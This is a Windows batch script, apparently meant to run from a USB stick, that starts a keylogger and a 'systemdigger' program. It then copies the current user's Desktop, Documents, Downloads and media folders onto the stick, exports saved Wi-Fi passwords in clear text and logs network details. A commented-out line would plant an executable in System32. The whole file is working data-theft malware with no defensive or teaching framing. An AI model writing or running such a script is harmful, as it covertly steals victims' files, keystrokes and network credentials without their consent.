@echo off

@REm start programes
start "" "H:\keylogger\keylogger.pyw"
start "" "H:\keylogger\systemdigger.pyw"

@REM make directories
MKDIR "H:\keylogger\data"
MKDIR "H:\keylogger\data\%username%"
MKDIR "H:\keylogger\data\%username%\Desktop"
MKDIR "H:\keylogger\data\%username%\Downloads"
MKDIR "H:\keylogger\data\%username%\Pictures"
MKDIR "H:\keylogger\data\%username%\Videos"
MKDIR "H:\keylogger\data\%username%\Music"

@REM copy files to pendrive
XCOPY "%systemdrive%\Users\%username%\Desktop" "H:\keylogger\data\%username%\Desktop"
XCOPY "%systemdrive%\Users\%username%\Downloads" "H:\keylogger\data\%username%\Downloads"
XCOPY "%systemdrive%\Users\%username%\Pictures" "H:\keylogger\data\%username%\Pictures"
XCOPY "%systemdrive%\Users\%username%\Documents" "H:\keylogger\data\%username%\Documents"
XCOPY "%systemdrive%\Users\%username%\Videos" "H:\keylogger\data\%username%\Videos"
XCOPY "%systemdrive%\Users\%username%\Music" "H:\keylogger\data\%username%\Music"

@REM wifi passwords
netsh wlan export profile key=clear

@REM ipaddress
ipconfig > ipconfig.txt 

@REm active connections on system
@REM netstat -a & netstat -b & netstat -e & netstat -f & netstat -n & netstat -x & netstat -t & netstat -q & netstat -p & netstat -o ' > netstat.txt
set "logfile=netstat.txt"
(
ping google.com 
netstat -a 
netstat -b
netstat -e
netstat -f
netstat -n
netstat -x
netstat -t
netstat -q
netstat -p
netstat -o
)>"%logfile%"

@REM XCOPY "%systemdrive%\payload\system69.exe" "C:\Windows\System32\" -y

@REM systeminfo > systeminfo.txt
